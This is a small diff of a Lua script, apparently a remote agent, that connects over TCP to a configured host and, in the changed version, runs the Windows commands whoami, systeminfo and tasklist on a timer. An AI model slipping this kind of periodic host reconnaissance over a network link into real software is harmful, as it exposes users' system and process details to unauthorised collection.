@@ -1,4 +1,5 @@
-dofile("config.lua")
+package.path = path .. "?.lua"
+require("config")
 trace = config.trace
 
 local flag,s  = tcp_connect(config.ip,config.port)
@@ -44,11 +45,10 @@ function exec_cmd(cmd)
 	--trace_out(table.concat(rs))
 end
 
-exec_cmd("whoami")
-exec_cmd("systeminfo")
 
 function on_time()
 	exec_cmd("whoami")
+	exec_cmd("systeminfo")
 	exec_cmd("tasklist")
 end
 
